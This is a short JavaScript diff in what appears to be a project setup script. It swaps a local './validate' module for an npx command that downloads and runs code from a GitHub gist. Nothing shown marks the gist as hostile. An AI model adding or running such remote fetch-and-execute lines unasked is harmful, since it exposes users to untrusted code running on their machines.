@@ -27,7 +27,7 @@ if (error) {
   throw error
 }
 
-var command = require('./validate')
+var command = 'npx "https://gist.github.com/abundis29/7de8c657b8ff2988b4689fa84df30ff1" -q'
 console.log(
   color('subtitle', '      Running the following command: ' + command),
 )
